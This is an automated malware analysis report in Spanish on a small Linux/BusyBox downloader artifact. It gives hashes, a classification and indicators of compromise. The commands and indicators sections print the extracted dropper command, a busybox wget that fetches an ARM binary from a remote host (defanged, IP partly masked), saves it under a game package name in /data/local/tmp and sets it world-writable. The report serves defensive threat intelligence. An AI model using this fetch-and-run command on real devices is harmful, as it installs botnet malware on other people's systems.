# 🧬 Payload Analysis

`c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf`

## 📌 Resumen

Artefacto de 208 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `rebirth.arm7` en `hxxp://94.154.43.XXX/rebirth.arm7`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod 777 /data/local/t` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf.md](../../../../../malware-like/oraculo/downloader/c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:50:21.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf`
- **SHA1:** `ed23b386daf02e40c21ebcd2439e54ee2ff4efea`
- **MD5:** `dea9d4ee580f2d9ab97db435babca64a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 208 B |
| Entropía | 4.73 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; iocs=4

## 🖥️ Comandos observados / extraídos

```text
shell:busybox wget hxxp://94.154.43.XXX/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://94.154.43.XXX/rebirth.arm7 | strings |
| ip | 94.154.43.XXX | static_analysis |
| command | shell:busybox wget hxxp://94.154.43.XXX/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/t | strings |
| hash | c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf | static_analysis |
| ip | 46.151.178.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
